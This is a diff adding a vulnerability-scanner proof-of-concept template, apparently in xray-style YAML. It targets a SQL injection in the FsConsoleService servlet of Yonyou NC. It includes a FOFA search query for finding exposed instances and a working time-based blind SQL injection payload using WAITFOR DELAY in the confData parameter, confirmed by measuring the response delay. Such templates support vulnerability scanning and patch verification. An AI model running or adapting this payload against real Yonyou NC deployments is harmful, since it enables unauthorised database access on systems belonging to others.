@@ -1,0 +1,20 @@
+id: poc-yaml-yongyou-nc-fsconsoleservice-sqli
+info:
+  name: 用友NC FsConsoleService SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /index.jsp
+  expression: status_code == 200 && contains(body,"Yonyou NC")
+- method: GET
+  path: /servlet/~uapbs/uap.pub.fs.console.FsConsoleService?confData=guid%3d233%27;WAITFOR+DELAY+%270:0:{{.t1}}%27--+&operType=filterLog
+  expression: status_code == 200 && contains(headers,".server") && body == "" && duration
+    > t1 && duration < t2
+transport: http
